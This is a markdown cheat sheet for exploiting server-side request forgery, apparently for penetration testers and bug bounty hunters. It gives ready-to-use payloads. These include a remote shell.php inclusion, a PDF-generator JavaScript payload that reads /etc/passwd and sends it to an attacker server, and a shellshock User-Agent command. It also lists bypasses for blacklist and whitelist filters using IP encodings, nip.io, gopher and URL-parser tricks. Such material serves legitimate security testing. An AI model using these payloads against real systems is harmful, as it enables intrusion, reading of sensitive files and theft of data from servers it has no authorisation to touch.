# Content
- [Exploiting SSRF vulnerabilities can lead to](#exploiting-ssrf-vulnerabilities-can-lead-to)
- 



## What can SSRF vulnerabilities can lead to:
- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution


## Where to find SSRF :
- Parts of HTTP requests, including (URLs,headrs,...)
```
Note: Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity.
That being said, fuzzing should not be limited to user input fields only.
Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.
```
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses


## Testing if app vulnerable to SSRF
The most common test is for local and remote file inclusion

- Load the Contents of a File (try RCE)
```
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

- Access a Restricted Page
```
GET https://example.com/page?page=http://localhost/admin

Or:

GET https://example.com/page?page=http://127.0.0.1/admin

```
### methdology 
- try to include local or remote files (http,file,ftp)
- fuzz ports and check functionalities (ex:get dir listing)
- try to get info about the server (ex:/proc/self/environ , /etc/passwd)
- do not forget to url encode if going through more than one app (ex:trible url encode)


## Blind SSRF
- We can detect blind SSRF vulnerabilities via out-of-band techniques
- Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

### blind SSRF via pdf generator 
```
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>


```
### blind SSRF via User-Agent header (shellshock)
```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

## Bypass

### SSRF with blacklist-based input filters

- Using an alternative IP representation for 127.0.0.1
```
127.1.
017700000001 (octal)
0x7f000001 (hexadecimal)
2130706433 (integer)
::ffff:7f00:1  , 0:0:0:0:0:ffff:7f00:0001 , 0000:0000:0000:0000:0000:ffff:7f00:0001(IPv6)

```
- Registering your own domain name that resolves to 127.0.0.1 OR any internal ip.
- Obfuscating blocked strings using URL encoding or case variation.
- Try using different redirect codes, as well as different protocols for the target URL.
```
file:// (file read)
netdoc:// (file read)
dict://
gopher://
jar://
ldap://

You might be able to get file read.

Or send multi-line requests to gain additional impact

(Ex: gopher + redis = likely RCE)
```
- Nip.io allows simple wildcard DNS for any IP address (127.0.0.1.nip.io = 127.0.0.1 )
```
127.0.0.1.nip.io  
0x7f000001.nip.io (hexadecimal IP notation)
Something.google.com.127.0.0.1.nip.io
```


### SSRF with whitelist-based input filters

- You can embed credentials in a URL before the hostname, using the @ character. For example:
```bash
https://expected-host:fakepassword@evil-host
```
- You can use the # character to indicate a URL fragment. For example:
```bash
https://evil-host#expected-host
```
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```bash
https://expected-host.evil-host
```
- You can URL-encode characters to confuse the URL-parsing code This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
```text
Note
that you can also try double-encoding characters
some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
```
- You can use combinations of these techniques together.

